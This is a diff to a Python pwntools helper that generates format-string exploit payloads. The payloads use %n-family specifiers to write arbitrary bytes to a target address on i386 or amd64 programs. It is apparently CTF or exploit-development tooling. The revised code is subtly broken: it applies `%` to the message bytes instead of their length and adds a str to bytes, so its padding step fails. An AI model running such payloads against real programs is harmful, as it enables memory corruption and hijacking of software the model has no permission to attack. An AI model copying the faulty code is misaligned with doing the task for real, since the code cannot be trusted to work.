@@ -1,25 +1,23 @@
-from pwn import u32, p32, p64
+from ..Utils.pwntools_import import u32, context, flat
 
 
-def gen_fmt_write2target_payload(msg: bytes, target_addr: int, fmt_buf_idx: int, arch: str, step: int=1):
-    """
-    - input : `msg (bytes)`, `target_addr (int)`, `arch (str)`, `step (int, default 1)`
-    - output : `payload (bytes)`
-    """
+def fmt_write2target_payload(msg: bytes, target_addr: int, msg_fmtidx: int, step: int = 1):
+    assert step in (1, 2, 4)
+    assert context.arch in ('i386', 'amd64')
+    
+    if msg % step != 0:
+        msg += '\0' * (step - (len(msg) % step))
 
-    assert (step in (1, 2, 4)) and (arch in ('i386', 'amd64')) and (len(msg) % step) == 0
+    length, mask = len(msg), (1 << (8 * step)) - 1
+    addr_length = context.mask.bit_length() // 8
 
-    length, mask = len(msg), int('ff' * step, 16)
-    addr_length = 8 if (arch == 'amd64') else 4
-
-    prenum, payload = 0, ''
+    display_length = 0
+    payload = ''
     for i in range(0, length, step):
-        num = u32(msg[i: i + step].ljust(4, b'\0'))
-
-        if num != prenum:
-            payload += f'%{(num - prenum) & mask}c'
-            prenum = num
-
+        byte = u32(msg[i: i + step].ljust(4, b'\0'))
+        if byte != display_length:
+            payload += f'%{(byte - display_length) & mask}c'
+            display_length = byte
         if step == 1:
             payload += '%{}$hhn'
         elif step == 2:
@@ -27,16 +25,14 @@ def gen_fmt_write2target_payload(msg: bytes, target_addr: int, fmt_buf_idx: int,
         else:
             payload += '%{}$n'
 
-    predict_length = len(payload)
-    predict_start_idx = fmt_buf_idx + (predict_length - (predict_length % addr_length) + addr_length) // addr_length
+    predict_payload_length = len(payload)
+    predict_start_fmtidx = msg_fmtidx + (predict_payload_length) // addr_length + 1
     while True:
-        new_payload = payload.format(*[predict_start_idx + i for i in range(length // step)])
-        if len(new_payload) <= (predict_start_idx - fmt_buf_idx) * addr_length:
-            payload = new_payload.ljust((predict_start_idx - fmt_buf_idx) * addr_length, '.')
+        new_payload = payload.format(*[predict_start_fmtidx + i for i in range(length // step)])
+        if len(new_payload) <= (predict_start_fmtidx - msg_fmtidx) * addr_length:
+            payload = new_payload.ljust((predict_start_fmtidx - msg_fmtidx) * addr_length, '.')
             break
-        predict_start_idx += 1
+        predict_start_fmtidx += 1
 
-    payload = payload.encode()
-    for i in range(0, length, step):
-        payload += p64(target_addr + i) if arch == 'amd64' else p32(target_addr + i)
-    return payload
+    return payload.encode() + flat(*[target_addr + i for i in range(0, length, step)])
+
